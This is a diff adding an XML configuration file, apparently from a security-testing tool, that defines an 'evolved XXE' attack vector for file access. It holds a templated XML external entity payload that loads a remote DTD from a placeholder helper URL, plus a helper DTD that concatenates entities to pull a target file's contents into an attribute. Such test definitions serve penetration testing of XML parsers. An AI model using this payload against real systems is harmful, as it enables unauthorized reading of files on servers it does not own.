@@ -1,0 +1,22 @@
+<config>
+<name>FileAccess: Bypassing Restrictions of XXE</name>
+<description>This class of attacks vectors is called evolved XXE attacks and is used to (i) bypass restrictions of classic XXE attacks and (ii) for Out-of-Band attacks.</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>true</targetFile>
+    <helperURL>true</helperURL>
+    <attackListenerURL>false</attackListenerURL>
+    <externalResources>true</externalResources>
+</params>
+<attackvectors>
+<attackvector>
+<directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+]>
+<data attrib='&internal;'/>]]></directMessage>
+<helperMessage><![CDATA[<!ENTITY all '%start;%goodies;%end;'>]]></helperMessage>
+</attackvector>
+</attackvectors>
+</config>
